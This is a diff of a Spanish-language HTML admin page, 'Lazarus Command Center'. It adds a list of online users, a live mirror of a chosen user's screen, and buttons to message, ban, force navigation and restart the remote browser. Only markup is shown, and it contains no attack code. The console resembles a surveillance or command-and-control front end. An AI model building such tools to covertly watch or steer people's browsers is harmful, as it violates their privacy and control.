@@ -2,52 +2,70 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Lazarus Hub | Control Panel</title>
+    <title>Lazarus Command Center | Admin</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 350px; border-right: 1px solid #00ff41; padding: 20px; overflow-y: auto; background: #050505; }
-        .main-view { flex: 1; padding: 20px; display: flex; flex-direction: column; }
-        .monitor { flex: 1; border: 2px solid #00ff41; background: white; border-radius: 10px; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        .card { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
-        .btn { width: 100%; padding: 10px; margin-top: 5px; cursor: pointer; border: 1px solid #00ff41; background: none; color: #00ff41; font-weight: bold; }
-        .btn:hover { background: #00ff41; color: black; }
-        .btn-red { border-color: red; color: red; }
-        .btn-red:hover { background: red; color: white; }
+        /* LISTA DE USUARIOS (IZQUIERDA) */
+        .user-sidebar { width: 300px; border-right: 1px solid #00ff41; background: #050505; display: flex; flex-direction: column; }
+        .user-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; transition: 0.3s; }
+        .user-item:hover, .user-item.active { background: #00ff41; color: #000; }
+        .online-dot { width: 10px; height: 10px; background: lime; border-radius: 50%; display: inline-block; margin-right: 10px; animation: pulse 1s infinite; }
+
+        /* CENTRAL (MONITOR) */
+        .main-monitor { flex: 1; display: flex; flex-direction: column; padding: 20px; }
+        .screen-glass { flex: 1; border: 2px solid #00ff41; border-radius: 10px; background: #fff; overflow: hidden; position: relative; }
+        iframe { width: 100%; height: 100%; border: none; }
+
+        /* COMANDOS (DERECHA) */
+        .control-panel { width: 350px; border-left: 1px solid #00ff41; background: #050505; padding: 20px; }
+        .cmd-btn { width: 100%; padding: 12px; margin-bottom: 10px; background: none; border: 1px solid #00ff41; color: #00ff41; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .cmd-btn:hover { background: #00ff41; color: black; }
+        .danger { border-color: #ff0000; color: #ff0000; }
+        .danger:hover { background: #ff0000; color: white; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <h2>CENTRAL LAZARUS</h2>
-        <div id="user-info" class="card">Selecciona un usuario...</div>
-        
-        <div class="card">
-            <h3>COMANDOS DE CONTROL</h3>
-            <input type="text" id="target" placeholder="ID Usuario" style="width:90%; padding:8px; margin-bottom:10px;">
-            <button class="btn btn-red" onclick="enviar('BAN')">BANEAR (ROJO)</button>
-            <button class="btn" onclick="enviar('UNBAN')">DESBANEAR</button>
-            <hr>
-            <button class="btn" style="color:orange; border-color:orange;" onclick="enviar('MUTE')">MUTEAR</button>
-            <button class="btn" onclick="enviar('UNMUTE')">DESMUTEAR</button>
-        </div>
 
-        <div class="card">
-            <h3>BLOQUEAR LINK</h3>
-            <input type="text" id="bad-link" placeholder="facebook.com" style="width:90%; padding:8px;">
-            <button class="btn" onclick="bloquear()">AÑADIR BLACKLIST</button>
-        </div>
+<div class="user-sidebar">
+    <div style="padding: 20px; border-bottom: 2px solid #00ff41;">
+        <h3>USUARIOS ONLINE</h3>
+        <p id="count">0 detectados</p>
     </div>
+    <div id="user-list"></div>
+</div>
 
-    <div class="main-view">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h2>PANTALLA EN TIEMPO REAL</h2>
-            <div id="last-seen">Sincronizando...</div>
-        </div>
-        <div class="monitor">
-            <iframe id="live-frame"></iframe>
-        </div>
+<div class="main-monitor">
+    <div style="display: flex; justify-content: space-between;">
+        <h2 id="current-target-name">SELECCIONA UN OBJETIVO...</h2>
+        <h2 id="last-url" style="font-size: 12px; color: #888;"></h2>
     </div>
-    <script src="admin.js"></script>
+    <div class="screen-glass">
+        <iframe id="mirror-screen" src="about:blank"></iframe>
+    </div>
+</div>
+
+<div class="control-panel">
+    <h3>CONSOLA DE MANDO</h3>
+    <input type="text" id="msg-input" placeholder="Mensaje para el usuario..." style="width:93%; padding:10px; background:#000; border:1px solid #00ff41; color:lime; margin-bottom:10px;">
+    <button class="cmd-btn" onclick="sendCommand('MSG')">ENVIAR MENSAJE</button>
+    
+    <button class="cmd-btn danger" onclick="sendCommand('BAN')">BANEAR DISPOSITIVO</button>
+    <button class="cmd-btn" onclick="sendCommand('UNBAN')">DESBANEAR</button>
+    
+    <hr style="border-color: #222;">
+    
+    <input type="text" id="goto-input" placeholder="Forzar URL (ej: google.com)" style="width:93%; padding:10px; background:#000; border:1px solid #00ff41; color:lime; margin-bottom:10px;">
+    <button class="cmd-btn" onclick="sendCommand('GOTO')">FORZAR NAVEGACIÓN</button>
+    
+    <button class="cmd-btn" onclick="sendCommand('RELOAD')">REINICIAR NAVEGADOR</button>
+    
+    <div style="margin-top: 30px; border: 1px dashed #444; padding: 10px; font-size: 11px;">
+        ESTADO DEL SISTEMA: <span style="color: lime;">ACTIVO</span><br>
+        SERVIDOR: SUPABASE-SA1
+    </div>
+</div>
+
+<script src="admin.js"></script>
 </body>
 </html>
